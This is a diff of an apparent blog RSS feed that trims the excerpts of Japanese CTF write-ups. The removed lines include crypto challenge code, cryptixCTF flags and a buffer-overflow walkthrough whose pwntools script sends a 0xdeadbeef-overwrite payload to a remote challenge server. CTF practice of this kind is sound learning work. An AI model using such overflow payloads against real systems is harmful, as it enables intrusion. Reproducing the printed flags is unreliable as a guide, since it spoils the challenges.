@@ -22,12 +22,7 @@
 某CTFをやってみよう会にて参加しました。
 普段は一人参加だったので、チームでやるのが新鮮で面白かったです。
 合計476点を獲得し、最終結果は119位でした。
-以下解けた問題のwrite up
-RockPaperScissors じゃんけんをして20連勝すればいい
-3^20分の1を当てるのはスマートでは無い
-相手はコミットメントを生成し、勝負の前に表示してくれるので、コミットメントから出す手を推測できれば勝ちである
-コミットメントは以下のように作られる（AESっぽい感じ）
-sbox = [221, 229, 120, 8, 119, 143, 33, 79, 22, 93, 239, 118, 130, 12, 63, 207, 90, 240, 199, 20, 181, 4, 139, 98, 78, 32, 94, 108, 100, 223, 1, 173, 220, 238, 217, 152, 62, 121, 117, 132, 2, 55, 125, 6, 34, 201, 254, 0, 228, 48, 250, 193, 147, 248, 89, 127, 174, 210, 57, 38, 216, 225, 43, 15, 142, 66, 70, 177, 237, 169, 67, 192, 30, 236, 131, 158, 136, 159, 9, 148, 103, 179, 141, 11, 46, 234, 36, 18, 191, 52, 231, 23, 88, 145, 101, 17, 74, 44, 122, 75, 235, 175, 54, 40, 27, 109, 73, 202, 129, 215, 83, 186, 7, 163, 29, 115, 243, 13, 105, 184, 68, 124, 189, 39, 140, 138, 165, 219, 161, 150, 59, 233, 208, 226, 176, 144, 113, 146, 19, 224, 111, 126, 222, 178, 47, 252, 99, 87, 134, 249, 69, 198, 164, 203, 194, 170, 26, 137, 204, 157, 180, 168, 162, 56, 81, 253, 213, 45, 21, 58, 24, 171, 37, 82, 53, 50, 84, 196, 232, 242, 244, 64, 80, 10, 114, 212, 187, 205, 28, 51, 182, 16, 107, 245, 211, 85, 92, 195, 5, 197, 200, 31, 183, 61, 123, 86, 167, 154, 41, 151, 35, 247, 246, 153, 95, 206, 149, 76, 112, 71, 230, 106, 188, 172, 241, 72, 156, 49, 14, 214, 155, 110, 102, 116, 128, 160, 135, 104, 77, 91, 190, 60, 42, 185, 96, 97, 251, 218, 133, 209, 65, 227, 3, 166, 255, 25] p = [5, 9, 1, 8, 3, 11, 0, 12, 7, 4, 14, 13, 10, 15, 6, 2] round = 16 def gen_commitments(): secret = bytearray(Random.</description>
+以下解けた問題のwrite up</description>
     </item>
     
     <item>
@@ -38,9 +33,7 @@ sbox = [221, 229, 120, 8, 119, 143, 33, 79, 22, 93, 239, 118, 130, 12, 63, 207, 
       <guid>https://kuzushiki.github.io/post/hackim2020/</guid>
       <description>HackTM CTF Quals 2020に参加しました！ (team: score_gazer)
 write up書きます
-RSA is easy #1 cというファイルにて、 eおよびnの値と、大量の暗号文が与えられる
-rsa.pyはRSA暗号のソースコード。
-import random from my_math import next_prime from flag import flag def egcd(a, b): x, y, u, v = 0, 1, 1, 0 while a != 0: q, r = b//a, b % a m, n = x-u*q, y-v*q b, a, x, y, u, v = a, r, u, v, m, n gcd = b return gcd, x, y def gen_keys(p, q): e = 65537 n = p * q phi = (p - 1) * (q - 1) gcd, d, b = egcd(e, phi) # Keys:((pub), (priv)) return ((e, n), (d, n)) def enc(key, p): e, n = key cipher = [pow(ord(char), e, n) for char in p] return cipher def dec(pk, c): key, n = pk plain = [chr(pow(char, key, n)) for char in c] return &amp;#39;&amp;#39;.</description>
+RSA is easy #1 cというファイルにて、 eおよびnの値と、大量の暗号文が与えられる</description>
     </item>
     
     <item>
@@ -53,16 +46,7 @@ import random from my_math import next_prime from flag import flag def egcd(a, b
 結果は2095点で19位でした。 あと一問で全完だったのに…悔しい。
 それでは解いた問題について解説していきます！
 ※解説を「ですます調」でやるとしっくりこないので、「だである調」に変えています。
-Make yourself comfortable (レベル１) Welcome gift ポイント  base64  解く ZmxhZ3t3ZWxjb21lX3RvX2NyeXB0aXhDVEZfYmFzZTY0aXRpc30Kをbase64でデコード
-フラグ flag{welcome_to_cryptixCTF_base64itis}
-You made it here! ポイント  デベロッパーツール(Chromeの場合)でソースを確認できる。  解く 問題ページのソースを見る。
-フラグの一部を確認
-&amp;lt;!--Came for the flag? Bingo! first part: flag{Pr3tty_ --&amp;gt; Sourcesタブに行き、style.cssとscript.jsも見てみる。
-同様にフラグの一部が書いてあるので組み合わせる。
-フラグ flag{Pr3tty_b4s1c_5tuff}
-Secret Code ポイント  stringsコマンドでファイルの文字列を確認できる。  解く stringsコマンドで問題ファイルの文字列を確認 grepコマンドをつけることで結果を絞り込める。
-:# strings secret_code | grep flag{ flag{sTring5_To_tH3_R35cU3} フラグ flag{sTring5_To_tH3_R35cU3}
-Moving On (レベル２) Mixed Up ポイント   単一換字暗号</description>
+Make yourself comfortable (レベル１) Welcome gift ポイント  base64  解く ZmxhZ3t3ZWxjb21lX3RvX2NyeXB0aXhDVEZfYmFzZTY0aXRpc30Kをbase64でデコード</description>
     </item>
     
     <item>
@@ -73,19 +57,7 @@ Moving On (レベル２) Mixed Up ポイント   単一換字暗号</description
       <guid>https://kuzushiki.github.io/post/hackcon2019/</guid>
       <description>HackCon&amp;rsquo;19に参加しました！ (team:score_gazer)
 結果は705点で112位でした
-baby b0f (Pwn 100 pt) ポイント  バッファオーバーフロー（以下BOF）  解く プログラムを実行するといきなり入力を求められる
- 間違った入力をするとTry Againと表示される  デバッガで逆アセンブルしつつ実行
-どうやらこの比較命令が怪しい
-RIP: 0x400760 (&amp;lt;main+153&amp;gt;:	cmp DWORD PTR [rbp-0x4],0xdeadbeef) BOFしてここを一致させることを考える
-以下のコマンドでrsp,rbpを表示
-x/32xw $rsp x/32xw $rbp 以下の行に注目
-0x7fffffffdeb0:	0x4141dfa0	0x000a4141	0x00000000	0xcafebabe 今回はAAAAと入力したが，その入力値が確認できる(Aは0x41に相当)
-さらに，0xcafebabeは[rbp-0x4]であることも分かる
-つまり，0xcafebabeの部分を0xdeadbeefにできれば良い
-ペイロードを作ってサーバに投げるプログラムを作って実行
-from pwn import * import socket con = remote(&amp;#39;68.183.158.95&amp;#39;, 8989) payload = b&amp;#39;A&amp;#39; * 10 payload += b&amp;#39;\xef\xbe\xad\xde&amp;#39; con.sendline(payload) con.interactive() フラグゲット
-補足   実は初めて解いたPwn問だったりする
-  Pwntoolsを使用してます</description>
+baby b0f (Pwn 100 pt) ポイント  バッファオーバーフロー（以下BOF）  解く プログラムを実行するといきなり入力を求められる</description>
     </item>
     
     <item>
